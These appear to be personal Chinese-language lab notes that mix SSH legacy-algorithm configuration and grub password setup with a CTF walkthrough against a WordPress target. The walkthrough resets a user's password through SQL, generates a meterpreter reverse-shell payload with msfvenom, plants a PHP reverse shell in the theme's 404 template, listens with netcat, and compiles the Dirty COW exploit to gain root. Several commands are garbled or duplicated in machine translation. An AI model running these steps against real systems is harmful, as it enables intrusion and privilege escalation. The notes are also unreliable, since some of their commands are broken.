ip addr 192.168.1.155/24 dev eth1
ifconfig eth1 up

16.04 中包含的 OpenSSH 版本禁用 ssh-dss。有一个包含此问题的遗留信息的简洁页面：[http://www.openssh.com/legacy.html](http://www.openssh.com/legacy.html)

添加网卡：[blog.51cto.com/506554897/1742070](https://blog.51cto.com/506554897/1742070)
service network restart

简而言之，您应该将选项添加`-oHostKeyAlgorithms=+ssh-dss`到 SSH 命令中：

```
ssh -oHostKeyAlgorithms=+ssh-dss root@192.168.8.109
```

---

您还可以在您的文件中添加主机模式，`~/.ssh/config`这样您就不必每次都指定密钥算法：

```
Host nas
  HostName 192.168.8.109
  HostKeyAlgorithms=+ssh-dss
```

这样做的另一个好处是您无需键入 IP 地址。相反，`ssh`将识别主机`nas`并知道连接到哪里。当然，您可以使用任何其他名称代替。

解决办法是`ssh`命令指定算法:

```
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa  user@host -p 2222
```

上面比较麻烦, 可以修改ssh配置文件 _~/.ssh/config_, 对于无法成功连接的host, 增加配置项:

~/.ssh/config

```
HostKeyAlgorithms +ssh-rsaPubkeyAcceptedKeyTypes +ssh-rsa
```

完整配置如下:

~/.ssh/config

```
Host ssh.alanwei.com  HostName ssh.alanwei.com  User alan  Port 22  HostKeyAlgorithms +ssh-rsa  PubkeyAcceptedKeyTypes +ssh-rsa
```

编辑grub配置文件#vi /etc/grub.conf
grub-crypt --md5

使用命令设置md5加密密码，复制生成的md5码

[root@localhost~]# grub-crypt --md5

Password:

Retype password:

$1$Vk/Pvw4.$i8b0feQIqez/CRInfnhcq0


# 做题
在wordpress数据库中找到wp_users表
查询： select * from 'wp_users'

update wp_users set user_pass=md5("52ctfhahaha") where user_login='eveng';

利用MSF生成反弹shell :
msfvenom -p php/meterpreter/reverse_tcp LHOST=Kali的IPLPORT=4444 -o Desktop/shell.php

利用Kali Linux自带反弹shell

root@kali:~# cat /usr/share/webshells/php/php-reverse-shell.php
复制此shell代码到404模板，修改IP为Kali地址，端口为4444

![[Pasted image 20240402153412.png]]

使用netcat，监听4444端口:nc -nlvp 4444

浏览器访问不存在的页面，触发404文件执行，例如http://靶机ip/?p=666

下载到Kali桌面并进入目录，使用gcc编译gcc-pthread dirty.c-o dirty -lcrypt
下载到kali桌面并进入目录，使用GCC编译GCC-线程dity.c-o脏-lcrypt

设置为执行权限

chmod +x dirty

使用python开启http服务器

Python-m SimpleHTTPSercer 80

执行dirty完成提权，
获得登录信息. ./dirty new password (任意密码)







